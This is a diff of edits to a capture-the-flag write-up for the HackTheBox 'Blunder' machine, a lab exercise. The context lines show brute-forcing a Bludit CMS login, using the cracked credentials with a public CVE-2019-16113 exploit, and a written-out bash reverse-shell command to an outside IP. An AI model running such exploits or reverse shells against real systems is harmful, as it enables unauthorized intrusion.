@@ -256,7 +256,7 @@ for password in wordlist:
 ```
 With this module, the password of the user *fergus* was brute forced as ***RolandDeschain***.
 ``` 
-[pwnd_root@manjaro Blunder]$ python exp.py 
+[pwnd_root@manjaro Blunder]$ python BluditBruteForce.py 
 [*] Trying: Load
 [*] Trying: Plugins
 [*] Trying: Include
@@ -273,7 +273,7 @@ Use fergus:RolandDeschain to login.
 With a set of working credentials found, the remote code vulnerability discussed earlier can now be used. A well written
 python exploit to leverage the vulnerability into RCE was found on GitHub as 
 [CVE-2019-16113.py](https://github.com/cybervaca/CVE-2019-16113/blob/master/CVE-2019-16113.py). Using the module a reverse
-shell was gained as
+shell was gained as follows.
 ```
 [pwnd_root@manjaro Blunder]$ python BluditReverseShell.py -u http://10.10.10.191 -user fergus -pass RolandDeschain -c "bash -c 'bash -i >& /dev/tcp/10.10.14.16/9090 0>&1'"      
  
@@ -294,8 +294,9 @@ shell was gained as
 [+] Delete: ztozltge.jpg
 ```
 ![Initial Shell](/assets/img/posts/blunder/initialshell.png)
+
 Per the screenshot, the reverse shell was from *www-data* with the lowest privileges, with no access to read the 
-user.txt file. Enumeration the target with this reverse shell revealed a file, ***users.php***, 
+*user.txt* file. Enumeration on the target with this reverse shell revealed a file, ***users.php***, 
 that contains the password hash for user ***hugo***.
 ```php 
 <?php defined('BLUDIT') or die('Bludit CMS.'); ?>
